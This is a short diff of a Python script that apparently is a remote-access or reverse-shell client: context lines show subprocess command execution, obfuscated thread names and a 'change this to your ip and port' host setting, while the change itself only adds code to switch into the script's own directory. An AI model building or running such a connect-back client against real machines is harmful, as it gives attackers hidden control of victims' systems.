@@ -3,8 +3,9 @@ from subprocess import check_output, call
 from time import sleep
 from sys import exit
 from random import randint
-from os import getlogin
+from os import getlogin, chdir, getcwd
 import threading
+import pathlib
 
 # change this to your ip and port:
 HOST = "10.0.0.5"
@@ -22,7 +23,8 @@ a0001 = threading.Thread(target=a0001)
 a0001.start()
 
 """
-
+path = (pathlib.Path(__file__).parent.absolute())
+chdir(path)
 global client
 
 
